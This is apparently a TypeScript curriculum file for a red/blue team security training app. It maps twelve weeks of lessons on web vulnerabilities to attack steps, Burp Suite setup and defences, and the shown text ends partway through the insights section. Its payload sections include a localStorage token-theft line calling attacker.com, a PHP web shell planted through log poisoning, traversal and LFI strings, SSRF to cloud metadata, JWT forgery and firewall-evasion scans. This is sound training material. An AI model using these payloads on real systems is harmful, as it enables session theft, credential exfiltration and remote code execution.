import { Week, DayLesson, BossLab } from "../types/curriculum";

// Helper generator creating rich Red/Blue Team content for every lesson across all 12 weeks
const getComprehensiveLessonContent = (
  weekIndex: number,
  dayIndex: number,
  dayTitle: string,
  competency: string,
  dayName: string
) => {
  const whatYouAreDoingMap: Record<number, string> = {
    0: `RED TEAM AUDIT:\nYou are auditing client-side JavaScript execution paths to locate un-sanitized DOM property references, window object assignments, and prototype pollution vectors. You will configure Burp Suite Match/Replace rules, craft custom JS payload strings, execute terminal exploits, and analyze browser state.`,
    1: `RED TEAM AUDIT:\nYou are acting as a reconnaissance specialist auditing compiled JavaScript bundles, Docker container layers, and Git commit logs to extract hardcoded API keys, database connection strings, and AWS secret credentials.`,
    2: `RED TEAM AUDIT:\nYou are auditing multi-tenant authorization boundaries. You will configure Burp Suite Repeater to tamper with numeric IDs, UUID parameters, HTTP Parameter Pollution (HPP) keys, and custom headers (X-User-ID) to read unauthorized tenant records.`,
    3: `RED TEAM AUDIT:\nYou are auditing business logic workflows in payment gateways and transaction checkouts. You will test edge cases like negative/fractional item quantities, out-of-order step execution, and high-velocity race conditions.`,
    4: `RED TEAM AUDIT:\nYou are auditing session tokens and JSON Web Tokens (JWT). You will forge tokens using 'alg': 'none', crack weak secret keys using Hashcat, and perform JWK/KID header injection attacks.`,
    5: `RED TEAM AUDIT:\nYou are mapping an enterprise target's external attack surface across thousands of subdomains, virtual hosts, and open ports using Go toolchains (Subfinder, Amass, Naabu, ffuf, httpx).`,
    6: `RED TEAM AUDIT:\nYou are reverse-engineering REST and GraphQL APIs. You will parse exposed Swagger/OpenAPI specifications, audit for Broken Object Level Authorization (BOLA), and escalate privileges via HTTP method tampering (GET to PUT/POST).`,
    7: `RED TEAM AUDIT:\nYou are mining un-linked HTTP query parameters and hidden debug flags using Arjun and Param Miner to bypass Web Application Firewalls (WAF) and identify developer backdoors.`,
    8: `RED TEAM AUDIT:\nYou are authoring professional executive vulnerability disclosure reports. You will structure high-impact submissions for HackerOne/Bugcrowd, calculate precise CVSS v3.1/v4.0 vectors, and write clear remediation steps.`,
    9: `RED TEAM AUDIT:\nYou are performing network-level port scanning and firewall evasion. You will configure Nmap scan timing, bypass filtering rules using decoy IPs and source port overrides, and fingerprint SSL/TLS cipher suites.`,
    10: `RED TEAM AUDIT:\nYou are auditing cloud infrastructure security across AWS, GCP, and Azure. You will exploit Server-Side Request Forgery (SSRF) vulnerabilities to bypass AWS IMDSv2 metadata protection and exfiltrate cloud service tokens.`,
    11: `RED TEAM AUDIT:\nYou are executing multi-vulnerability exploit chains. You will combine path traversal file upload bugs with Local File Inclusion (LFI) and SSRF to achieve complete Remote Code Execution (RCE).`
  };

  const vulnerabilityOriginMap: Record<number, string> = {
    0: `ORIGIN & ROOT CAUSE:\nModern front-end frameworks parse URL parameters and global objects dynamically. When developers use 'Object.assign()' or set 'element.innerHTML' without sanitization, attackers can inject property names like '__proto__.isAdmin' or clobber global DOM properties ('window.config').`,
    1: `ORIGIN & ROOT CAUSE:\nDuring rapid development sprints, software engineers hardcode API keys and environment variables directly in client source files for testing. When code is compiled using Webpack or pushed to Git repositories, these static credentials remain buried inside client bundles and historical commits.`,
    2: `ORIGIN & ROOT CAUSE:\nInsecure Direct Object References (IDOR) arise when application endpoints trust user-supplied parameters (like '?user_id=102') without verifying on the server that the logged-in user session actually owns that resource.`,
    3: `ORIGIN & ROOT CAUSE:\nBusiness logic flaws occur when developers assume users will only follow the intended UI button clicks. They fail to enforce server-side validation checks on numeric bounds (allowing negative cart items) or step dependencies.`,
    4: `ORIGIN & ROOT CAUSE:\nJWT vulnerabilities stem from weak server-side verification libraries. Accepting the 'none' algorithm header, using weak HMAC secrets, or trusting un-verified 'jwk'/'kid' header parameters allows attackers to manipulate user claims.`,
    5: `ORIGIN & ROOT CAUSE:\nLarge enterprises deploy hundreds of microservices across cloud providers. Forgotten staging environments ('staging-api.corp.com') and legacy virtual hosts often run un-patched code without centralized security monitoring.`,
    6: `ORIGIN & ROOT CAUSE:\nREST and GraphQL APIs decouple front-end UI from backend data stores. Developers frequently implement authorization checks at the UI layer rather than at the database object level, causing Broken Object Level Authorization (BOLA).`,
    7: `ORIGIN & ROOT CAUSE:\nDevelopers add hidden query parameters (like '?debug=true' or '?admin_bypass=1') to diagnose production bugs. These parameters remain active in production code without being documented in public API specs.`,
    8: `ORIGIN & ROOT CAUSE:\nIneffective vulnerability disclosure reports lack step-by-step reproduction steps, cURL commands, or impact metrics, leading to report rejection or lower bounty payouts on bug bounty platforms.`,
    9: `ORIGIN & ROOT CAUSE:\nMisconfigured network firewalls and permissive security groups allow external access to internal administrative services (such as Redis, Memcached, or SSH) on un-monitored secondary ports.`,
    10: `ORIGIN & ROOT CAUSE:\nServer-Side Request Forgery (SSRF) occurs when a web server fetches external URLs supplied by users without restricting access to loopback IP ranges (\`127.0.0.1\` or AWS IMDS metadata \`169.254.169.254\`).`,
    11: `ORIGIN & ROOT CAUSE:\nExploit chains arise when multiple low-severity issues (a file path traversal + un-sanitized template engine) interact, allowing an attacker to move from simple file reading to full Remote Code Execution (RCE).`
  };

  const pentesterFocusMap: Record<number, string> = {
    0: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Search JS source bundles for dangerous sinks: 'innerHTML', 'document.write', 'eval()', 'Object.assign()', and 'merge()'.\n2. Test parameter inputs with prototype pollution payloads: '?__proto__[isAdmin]=true' or '?constructor.prototype.status=active'.\n3. Check if global window variables (e.g. 'window.config.apiEndpoint') can be overridden using clobbered HTML tags ('<a id="config" href="...">').`,
    1: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Search JS files using regex patterns for credentials: AWS ('AKIA[0-9A-Z]{16}'), GCP ('AIza[0-9A-Za-z-_]{35}'), and Firebase URLs.\n2. Clone public GitHub repositories and inspect commit history using 'git log -p' or TruffleHog.\n3. Decompile Android APK bundles and extract credentials from 'strings.xml' or env configurations.`,
    2: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Identify all requests containing object IDs: '/api/v1/orders/1001' or 'X-User-ID: 55'.\n2. Swap user IDs with secondary test account numbers to check for missing access control.\n3. Test HTTP Parameter Pollution (HPP) by appending duplicate keys: '?id=101&id=102'.`,
    3: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Test negative numbers (-1) and fractional values (0.001) in cart quantities, prices, and transfer amounts.\n2. Send 50+ concurrent identical requests using Burp Turbo Intruder to test for race conditions on discount codes.\n3. Skip intermediate workflow steps (e.g. going straight from Step 1 to Step 4 in checkout).`,
    4: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Decode JWT tokens using jwt.io or Burp JWT Editor extension.\n2. Change 'alg' header to 'none' and remove the signature block.\n3. Brute-force HMAC secret keys using Hashcat with rockyou.txt wordlists.\n4. Inject self-signed public keys in the 'jwk' header parameter.`,
    5: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Run 'subfinder -d target.com -all' and 'amass enum -d target.com' to discover subdomains.\n2. Resolve IP records and perform port scans using Naabu and Rustscan.\n3. Probe for hidden virtual hosts using 'ffuf -u http://target.com -H "Host: FUZZ.target.com"'.`,
    6: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Append '/swagger.json', '/v2/api-docs', or '/graphql' to find undocumented API schemas.\n2. Test Broken Object Level Authorization (BOLA) by changing IDs in GET, PUT, and DELETE API endpoints.\n3. Convert GET requests to PUT/POST requests to test HTTP method tampering.`,
    7: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Run 'arjun -u https://target.com/api/v1/user -m GET,POST' to mine un-linked parameters.\n2. Test debug query parameters: '?debug=true', '?admin=1', '?testMode=1', or '?env=dev'.\n3. Mine custom cache-control headers: 'X-Forwarded-Host', 'X-Custom-IP-Authorization'.`,
    8: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Document exact step-by-step reproduction steps with cURL command lines.\n2. Calculate exact CVSS v3.1/v4.0 vector strings (e.g. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).\n3. Detail real-world business impact and provide clear developer remediation guidance.`,
    9: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Run Nmap scans with timing controls: 'nmap -sV -sC -T3 -p- target.com'.\n2. Bypass firewall filtering by spoofing source ports ('--source-port 53') or using decoy IPs ('-D RND:10').\n3. Probe SSL/TLS cryptographic cipher suites using testssl.sh.`,
    10: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Test URL parameters for SSRF: '?url=http://169.254.169.254/latest/meta-data/'.\n2. Bypass AWS IMDSv2 token headers using Open Redirect vulnerabilities or local header overrides.\n3. Probe for un-authenticated Azure Blob containers and public Google Cloud Function triggers.`,
    11: `PENTESTER FOCUS & WHAT TO LOOK FOR:\n1. Combine Path Traversal during file upload ('filename="../../shell.php"') with LFI.\n2. Chain SSRF to access internal administrative panels, then trigger dynamic template injection.\n3. Escalate privileges from local read access to Remote Code Execution (RCE).`
  };

  const payloadCraftingMap: Record<number, string> = {
    0: `PAYLOAD CRAFTING LOGIC:\n1. DOM Clobbering: \`<iframe name="config" srcdoc="<a id='apiEndpoint' href='javascript:alert(1)'></a>"></iframe>\`\n2. Prototype Pollution: \`__proto__[isAdmin]=true\` or \`constructor.prototype.status=active\`\n3. LocalStorage Theft: \`<img src=x onerror="fetch('http://attacker.com/?t='+localStorage.getItem('token'))">\``,
    1: `PAYLOAD CRAFTING LOGIC:\n1. AWS Key Regex: \`AKIA[0-9A-Z]{16}\`\n2. GCP Key Regex: \`AIza[0-9A-Za-z-_]{35}\`\n3. Git History Search: \`git log -p -S "SECRET_KEY" -S "PASSWORD"\``,
    2: `PAYLOAD CRAFTING LOGIC:\n1. Header Override: \`X-User-ID: 1002\` or \`X-Forwarded-For: 127.0.0.1\`\n2. HPP Parameter Pollution: \`GET /api/user?id=101&id=102\`\n3. UUID Substitution: Replace client UUID with target victim UUID.`,
    3: `PAYLOAD CRAFTING LOGIC:\n1. Negative Quantity: \`{"cart_id": 1, "quantity": -5}\`\n2. Price Override: \`{"price": 0.01, "item_id": "laptop_pro"}\`\n3. Workflow Re-ordering: Send Disbursement API request before Verification API request.`,
    4: `PAYLOAD CRAFTING LOGIC:\n1. JWT None Alg: Change \`{"alg":"HS256"}\` to \`{"alg":"none"}\` and strip signature.\n2. JWK Header Injection: Inject self-signed public key in \`"jwk": {...}\` header parameter.\n3. Hashcat Cracking: \`hashcat -m 16500 jwt.txt rockyou.txt\``,
    5: `PAYLOAD CRAFTING LOGIC:\n1. Subfinder: \`subfinder -d target.com -all -silent\`\n2. VHost Fuzzing: \`ffuf -u http://target.com -H "Host: FUZZ.target.com" -w wordlist.txt -fs 1234\`\n3. Port Scan: \`naabu -host target.com -p -\``,
    6: `PAYLOAD CRAFTING LOGIC:\n1. BOLA Query: \`GET /api/v1/documents/target_doc_id\`\n2. Method Tampering: Change \`GET /api/v1/config\` to \`PUT /api/v1/config\` with \`{"role":"admin"}\`\n3. Swagger Specs: Access \`/api-docs\` or \`/swagger/v1/swagger.json\``,
    7: `PAYLOAD CRAFTING LOGIC:\n1. Arjun Mining: \`arjun -u https://target.com/page -m GET,POST\`\n2. Debug Flag Injection: \`?debug=true&admin=1&override=true\`\n3. Cache Poisoning Header: \`X-Forwarded-Host: evil-attacker.com\``,
    8: `PAYLOAD CRAFTING LOGIC:\n1. Report Title: \`[CRITICAL] BOLA on /api/v1/user Leads to Full Account Takeover\`\n2. CVSS Vector: \`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\` (Score 9.1)\n3. PoC cURL: \`curl -X GET "https://target.com/api/v1/user/102" -H "Authorization: Bearer TOKEN"\``,
    9: `PAYLOAD CRAFTING LOGIC:\n1. Nmap Scan: \`nmap -sV -sC -T3 -p- target.com\`\n2. Firewall Decoy: \`nmap -sS -D RND:10 --source-port 53 target.com\`\n3. Banner Grab: \`nc -nv target.com 8080\``,
    10: `PAYLOAD CRAFTING LOGIC:\n1. AWS IMDSv1 Query: \`http://169.254.169.254/latest/meta-data/iam/security-credentials/\`\n2. IMDSv2 Token Bypass: Fetch token via PUT request, then send token in \`X-aws-ec2-metadata-token\` header.\n3. S3 Bucket Audit: \`aws s3 ls s3://target-bucket-name --no-sign-request\``,
    11: `PAYLOAD CRAFTING LOGIC:\n1. Path Traversal Upload: \`filename="../../../etc/passwd"\`\n2. LFI Payload: \`GET /index.php?page=../../../../var/log/apache2/access.log\`\n3. RCE Execution: Inject PHP payload \`<?php system($_GET['cmd']); ?>\` into access logs.`
  };

  const burpSuiteSetupMap: Record<number, string> = {
    0: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Proxy -> Intercept: Enable Intercept to capture outbound client JS calls.\n2. Match and Replace Rules: Add rule in Proxy Options to automatically inject \`__proto__[isAdmin]=true\` into JSON request bodies.\n3. Extensions: Install 'DOM Invader' extension from BApp Store to automatically detect DOM clobbering sinks in real-time.`,
    1: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Burp Search: Use Ctrl+F in Target -> Site Map to search for regex strings (\`AKIA\`, \`AIza\`, \`secret\`).\n2. Extensions: Install 'Secret Finder' and 'JSMiner' from BApp Store to passively parse all loaded JS files for credentials.\n3. Logger++: Set up Logger++ filters to highlight HTTP responses containing secret keys in bright green.`,
    2: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Repeater: Send target requests to Repeater (Ctrl+R) to test ID parameter variations.\n2. Intruder: Set payload marker on user ID parameter (\`/user/\`§101§\`) and run Bumber/Sequential scan.\n3. Extensions: Install 'Autorize' from BApp Store to automatically test access controls using low-privileged session tokens.`,
    3: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Repeater: Intercept checkout requests and modify quantity values to negative integers.\n2. Turbo Intruder: Use Turbo Intruder Python script to send 100 concurrent requests in parallel for race conditions.\n3. Match/Replace: Automatically replace coupon codes or pricing flags in outbound HTTP POST bodies.`,
    4: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Extensions: Install 'JWT Editor' from BApp Store.\n2. Repeater JWT Tab: Right-click token in Repeater -> JWT Tab -> Select 'Switch Algorithm to None' or 'Inject JWK Header'.\n3. Match/Replace: Automatically replace Authorization headers with self-signed admin JWT tokens.`,
    5: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Scope: Define Target Scope (\`*.target.com\`) under Target -> Scope Settings.\n2. Passive Scanning: Enable passive proxy listening while browsing target web assets.\n3. Extensions: Install 'Param Miner' and 'Flow' from BApp Store to discover un-linked endpoints.`,
    6: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Extensions: Install 'OpenAPI Parser' and 'GraphQL Raider' from BApp Store.\n2. OpenAPI Parser: Import \`/swagger.json\` URL to automatically populate Repeater with every API endpoint.\n3. Repeater: Test changing GET requests to PUT/POST requests with custom JSON bodies.`,
    7: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Extensions: Install 'Param Miner' from BApp Store.\n2. Param Miner Action: Right-click target request -> Extensions -> Param Miner -> 'Guess headers' or 'Guess params'.\n3. Logger++: Monitor background HTTP requests for status code differences indicating matted parameters.`,
    8: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Copy as cURL: Right-click verified exploit request in Repeater -> 'Copy as cURL'.\n2. Organizer: Save verified exploit requests in Burp Organizer with notes for report drafting.\n3. Engagement Tools: Use Burp 'Generate CSRF PoC' or export HTTP request/response text files.`,
    9: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Upstream Proxy: Set up Upstream Proxy servers in Burp Settings if testing through external SOCKS5 VPNs.\n2. Extensions: Install 'IP Rotate' from BApp Store to distribute outbound requests across AWS API Gateways.\n3. Project Options: Configure custom TLS/SSL ciphers and protocols.`,
    10: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Collaborator: Use Burp Collaborator Client to generate unique OAST domain payloads (\`http://xxx.burpcollaborator.net\`).\n2. Repeater: Inject Collaborator URL into URL parameters to test for out-of-band SSRF.\n3. Extensions: Install 'SSRF King' from BApp Store.`,
    11: `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Repeater: Intercept file upload POST requests and modify Content-Type and filename parameters.\n2. Match/Replace: Set automatic rules to swap file extension extensions (\`.png\` -> \`.php\`).\n3. Extensions: Install 'Upload Scanner' and 'ActiveScan++' from BApp Store.`
  };

  const blueTeamDefenseMap: Record<number, string> = {
    0: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Code Prevention: Freeze Object prototypes using 'Object.freeze(Object.prototype)' on application startup.\n2. DOM Sanitization: Use DOMPurify before setting innerHTML ('DOMPurify.sanitize(input)').\n3. Content Security Policy (CSP): Deploy strict CSP headers ('script-src 'self' 'nonce-...'') to block unauthorized inline script execution.`,
    1: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Secret Management: Store API keys in environment variables or AWS Secrets Manager / HashiCorp Vault. Never hardcode keys in client-side code.\n2. Git Pre-commit Hooks: Use GitGuardian or TruffleHog in CI/CD pipelines to automatically block commits containing AWS/GCP API key patterns.\n3. Key Rotation: Revoke exposed API keys immediately upon detection.`,
    2: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Server-Side Authorization: Enforce object-level access controls on every API endpoint (\`if (doc.ownerId !== req.user.id) throw Forbidden()\`).\n2. Indirect Mapping: Use unpredictable UUIDv4 identifiers or mapped session tokens rather than sequential integer IDs.\n3. Audit Logging: Log all access control denial events for SIEM monitoring.`,
    3: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Input Validation: Enforce strict boundary checks on numeric inputs (\`if (quantity <= 0) throw ValidationError()\`).\n2. Mutex Locks: Use Redis distributed locks or database transaction row-level locks (\`SELECT FOR UPDATE\`) to prevent race conditions.\n3. Step Enforcement: Validate session state transition flags on the server before processing disbursements.`,
    4: `BLUE TEAM DEFENSE & SECURE CODING:\n1. JWT Algorithm Enforcement: Explicitly enforce allowed algorithms on the server (\`jwt.verify(token, secret, { algorithms: ['HS256'] })\`). Never accept 'none'.\n2. Strong Secrets: Use 512-bit randomly generated secret keys for HMAC signing.\n3. JWK Verification: Validate JWK/KID headers against a trusted internal key registry.`,
    5: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Asset Inventory: Maintain a centralized cloud asset inventory (AWS Config, CloudTrail) to discover un-monitored subdomains.\n2. DNS Hygiene: Remove stale DNS CNAME records to prevent subdomain takeover attacks.\n3. Network Perimeter: Firewall internal staging microservices behind VPNs or zero-trust access gateways (Cloudflare Access).`,
    6: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Object-Level Access Control: Enforce BOLA authorization checks on every REST and GraphQL query resolver.\n2. Schema Validation: Enforce strict JSON Schema validation on input payloads to prevent Mass Assignment attacks.\n3. Method Restrictions: Explicitly disable unused HTTP methods (PUT, DELETE, PATCH) on public endpoints.`,
    7: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Remove Debug Flags: Strip all development debug code and test query parameters (\`debug=true\`) before production deployment.\n2. WAF Rules: Deploy Web Application Firewall rules to block un-documented query parameters.\n3. Cache Keys: Include all relevant query parameters and headers in HTTP cache key calculations.`,
    8: `BLUE TEAM DEFENSE & SECURE CODING:\n1. VDP Policy: Publish clear Vulnerability Disclosure Program policies (security.txt) detailing safe harbor guidelines.\n2. Triage SLA: Establish rapid SLA response times for Critical vulnerability reports (under 24 hours).\n3. Patch Management: Deploy root-cause fixes across all microservices rather than applying superficial hotfixes.`,
    9: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Firewall Rules: Enforce Default Deny firewall rules on all external network interfaces.\n2. Network Segmentation: Isolate administrative management ports (SSH, Redis, Elastic) inside private VPC subnets.\n3. Intrusion Detection: Deploy Suricata / Snort IDS rules to flag port scan sweeps.`,
    10: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Require AWS IMDSv2: Enforce IMDSv2 on all EC2 instances (\`http-tokens=required\`) to block SSRF metadata exfiltration.\n2. URL Allowlisting: Restrict server-side HTTP fetchers to explicit allowlists of trusted domain names.\n3. Network Isolation: Block outbound requests to local loopback (\`127.0.0.1\`) and cloud metadata (\`169.254.169.254\`).`,
    11: `BLUE TEAM DEFENSE & SECURE CODING:\n1. Defense-in-Depth: Enforce strict security controls at every layer (input validation, file type checks, container isolation).\n2. Unprivileged Execution: Run web application containers under unprivileged Linux service accounts (\`nobody\` or non-root).\n3. File System Read-Only: Mount application storage containers as read-only file systems.`
  };

  const tutorialsMap: Record<number, string[]> = {
    0: [
      `Step 1: Open the target code inspection box below and locate un-sanitized DOM or variable assignments.`,
      `Step 2: Identify where user input (query parameters or hash fragments) is passed to dangerous sinks like innerHTML or Object.assign.`,
      `Step 3: Construct your exploit payload (e.g. __proto__.isAdmin=true or clobbering an iframe ID).`,
      `Step 4: Execute the payload in the local shell terminal to compromise the sandbox container.`,
      `Step 5: Copy the captured flag into the verification box and click 'Verify & Complete' to earn XP.`
    ],
    1: [
      `Step 1: Inspect compiled JavaScript bundles or environment files looking for API key signatures.`,
      `Step 2: Apply regex search patterns matching AWS keys (AKIA...), GCP keys (AIza...), or Firebase databases.`,
      `Step 3: Enter your credential extraction payload or regex search query in the workspace.`,
      `Step 4: Run the exploit in the terminal shell to parse leaked secrets and retrieve system flags.`,
      `Step 5: Submit the verified flag to record your research log on GitHub.`
    ],
    2: [
      `Step 1: Intercept the target API request (e.g. GET /api/v1/users/101 or X-User-ID: 101).`,
      `Step 2: Test modifying numeric IDs, substituting UUIDs, or injecting HTTP Parameter Pollution (HPP) strings.`,
      `Step 3: Type your header override or parameter payload string in the terminal workspace.`,
      `Step 4: Run the exploit to bypass access controls and extract the flag.`,
      `Step 5: Submit the flag to claim your IDOR Master badge.`
    ],
    3: [
      `Step 1: Analyze the multi-step transaction workflow (Select -> Discount -> Checkout -> Disbursement).`,
      `Step 2: Test logic edge cases such as negative quantities (-5), fractional prices, or out-of-order execution steps.`,
      `Step 3: Type your business logic exploit payload in the workspace.`,
      `Step 4: Execute the payload in the terminal shell to trigger state collision and retrieve the flag.`,
      `Step 5: Paste the flag into the verification input to complete the challenge.`
    ],
    4: [
      `Step 1: Decode the JWT session token parts (Header, Payload, Signature) using Base64 decoding.`,
      `Step 2: Identify token flaws such as alg: 'none', weak secret keys, or JWK header injection points.`,
      `Step 3: Write your modified token payload specifying administrative roles.`,
      `Step 4: Run the token forgery exploit in the terminal shell to bypass authentication barriers.`,
      `Step 5: Submit the flag to claim your JWT Forger badge.`
    ],
    5: [
      `Step 1: Run subdomain discovery tools (Subfinder, Amass) against the target domain.`,
      `Step 2: Probe for live HTTP services and virtual hosts (VHosts) using ffuf and Massdns.`,
      `Step 3: Type your recon command or target subdomain parameter in the terminal workspace.`,
      `Step 4: Execute the scan in the terminal shell to discover hidden admin subdomains and flags.`,
      `Step 5: Submit the flag to log your Recon Specialist achievement.`
    ],
    6: [
      `Step 1: Audit exposed Swagger / OpenAPI endpoints to map resource paths and parameters.`,
      `Step 2: Test for Broken Object Level Authorization (BOLA) by changing object resource IDs in GET/PUT calls.`,
      `Step 3: Write your API method override or BOLA payload in the workspace.`,
      `Step 4: Run the exploit in the terminal shell to mutate administrative configurations.`,
      `Step 5: Submit the verified API flag.`
    ],
    7: [
      `Step 1: Scan target web endpoints for un-linked parameters using Arjun or Param Miner logic.`,
      `Step 2: Look for hidden administrative flags like debug=true, admin=1, or X-HTTP-Method-Override.`,
      `Step 3: Type your parameter mining string in the payload workspace.`,
      `Step 4: Run the exploit in the shell to discover secret caching parameters and flags.`,
      `Step 5: Verify the flag to complete the parameter mining module.`
    ],
    8: [
      `Step 1: Organize vulnerability findings into Executive Summary, Impact Analysis, and PoC steps.`,
      `Step 2: Calculate accurate CVSS v3.1 / v4.0 severity vector strings.`,
      `Step 3: Enter your structured report description and remediation guidance in the form.`,
      `Step 4: Run verification to submit your corporate security assessment.`,
      `Step 5: Submit the report to earn corporate reporting credentials.`
    ],
    9: [
      `Step 1: Optimize Nmap scan timing parameters to avoid firewall rate-limiting (-T3/T4).`,
      `Step 2: Probe service banners and cryptographic SSL/TLS cipher suites on target ports.`,
      `Step 3: Type your firewall-evading scan string in the payload workspace.`,
      `Step 4: Run the network scan in the shell to locate un-filtered administration ports.`,
      `Step 5: Submit the verified network flag.`
    ],
    10: [
      `Step 1: Locate Server-Side Request Forgery (SSRF) parameters targeting AWS/GCP metadata endpoints.`,
      `Step 2: Test bypassing IMDSv2 token headers using Open Redirects or local header manipulation.`,
      `Step 3: Type your SSRF metadata query string (e.g. http://169.254.169.254/latest/meta-data/).`,
      `Step 4: Execute the SSRF exploit to exfiltrate cloud service tokens and flags.`,
      `Step 5: Paste the flag to unlock the Cloud Exfiltrator badge.`
    ],
    11: [
      `Step 1: Identify initial entry points (e.g. path traversal during SVG file upload).`,
      `Step 2: Chain local file inclusion (LFI) with SSRF query parameters targeting internal nodes.`,
      `Step 3: Write your multi-stage exploit chain payload string in the workspace.`,
      `Step 4: Run the exploit chain in the terminal shell to achieve Remote Code Execution (RCE).`,
      `Step 5: Copy the grandmaster flag and submit to complete the 12-week program!`
    ]
  };

  const resourcesMap: Record<number, { name: string; url: string; category: string }[]> = {
    0: [
      { name: "PortSwigger Web Security Academy: DOM Clobbering", url: "https://portswigger.net/web-security/dom-based/dom-clobbering", category: "Lab & Guide" },
      { name: "OWASP Client-Side Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/", category: "Standard" },
      { name: "DOM Purify Library Documentation", url: "https://github.com/cure53/DOMPurify", category: "Defense" }
    ],
    1: [
      { name: "Trufflehog Secret Scanner Repository", url: "https://github.com/trufflesecurity/trufflehog", category: "Tooling" },
      { name: "GitGuardian Secret Detection Standards", url: "https://www.gitguardian.com/", category: "Reference" },
      { name: "Regex101 Pattern Tester", url: "https://regex101.com/", category: "Utility" }
    ],
    2: [
      { name: "PortSwigger Access Control Cheat Sheet", url: "https://portswigger.net/web-security/access-control", category: "Cheat Sheet" },
      { name: "OWASP Insecure Direct Object Reference Prevention", url: "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html", category: "Standard" }
    ],
    3: [
      { name: "PortSwigger Business Logic Vulnerabilities Guide", url: "https://portswigger.net/web-security/logic-flaws", category: "Guide" },
      { name: "OWASP Business Logic Testing Checklist", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README", category: "Checklist" }
    ],
    4: [
      { name: "RFC 7519: JSON Web Token (JWT) Specification", url: "https://datatracker.ietf.org/doc/html/rfc7519", category: "RFC Spec" },
      { name: "JWT.io Token Debugger & Encoder", url: "https://jwt.io/", category: "Tooling" },
      { name: "PortSwigger JWT Security Testing", url: "https://portswigger.net/web-security/jwt", category: "Lab & Guide" }
    ],
    5: [
      { name: "ProjectDiscovery Subfinder Repository", url: "https://github.com/projectdiscovery/subfinder", category: "Tooling" },
      { name: "OWASP Amass Reconnaissance Framework", url: "https://github.com/owasp-amass/amass", category: "Tooling" },
      { name: "ffuf Fast Web Fuzzer Repository", url: "https://github.com/ffuf/ffuf", category: "Tooling" }
    ],
    6: [
      { name: "OWASP API Security Top 10 Specification", url: "https://owasp.org/www-project-api-security/", category: "Standard" },
      { name: "PortSwigger API Security Testing Guide", url: "https://portswigger.net/web-security/api-testing", category: "Guide" }
    ],
    7: [
      { name: "Arjun Parameter Discovery Suite", url: "https://github.com/s0md3v/Arjun", category: "Tooling" },
      { name: "PortSwigger Web Cache Poisoning & Parameter Mining", url: "https://portswigger.net/web-security/web-cache-poisoning", category: "Guide" }
    ],
    8: [
      { name: "FIRST CVSS v3.1 Calculator Specification", url: "https://www.first.org/cvss/calculator/3.1", category: "Calculator" },
      { name: "HackerOne Bug Report Writing Guide", url: "https://www.hackerone.com/", category: "Guide" }
    ],
    9: [
      { name: "Nmap Network Mapper Official Reference Manual", url: "https://nmap.org/book/man.html", category: "Documentation" },
      { name: "SSL Labs Server Test Tool", url: "https://www.ssllabs.com/ssltest/", category: "Tooling" }
    ],
    10: [
      { name: "AWS Instance Metadata Service v2 (IMDSv2) Docs", url: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html", category: "Cloud Docs" },
      { name: "PortSwigger Server-Side Request Forgery (SSRF) Labs", url: "https://portswigger.net/web-security/ssrf", category: "Guide" }
    ],
    11: [
      { name: "PortSwigger Exploit Chaining & RCE Guides", url: "https://portswigger.net/web-security/server-side-template-injection", category: "Guide" },
      { name: "PayloadsAllTheThings Exploitation Repository", url: "https://github.com/swisskyrepo/PayloadsAllTheThings", category: "Repository" }
    ]
  };

  const insightsMap: Record<number, string> = {
    0: `💡 INDUSTRY INSIGHT & STATISTIC:\nAccording to HackerOne's Top Vulnerability Reports, client-side vulnerabilities like Prototype Pollution and DOM Clobbering regularly command bounties between $1,500 and $7,500 on major tech programs like Google, GitHub, and Shopify.`,
    1: `💡 INDUSTRY INSIGHT & STATISTIC:\nHardcoded cloud keys remain the #1 source of fast bounties for beginners. Over $10,000,000 in bounties were awarded on Bugcrowd for leaked AWS S3 keys, Firebase endpoints, and Docker configs in recent years.`,
    2: `💡 INDUSTRY INSIGHT & STATISTIC:\nInsecure Direct Object References (IDOR) are ranked in the top 3 highest-paying bug classes on Bugcrowd and HackerOne due to their severe privacy impact, averaging $2,000 - $10,000 per submission.`,
    3: `💡 INDUSTRY INSIGHT & STATISTIC:\nBusiness logic flaws require zero automated tools—only keen analytical observation. Researchers who identified race condition flaws in gift card checkouts earned $15,000+ bounties on major airline and e-commerce targets.`,
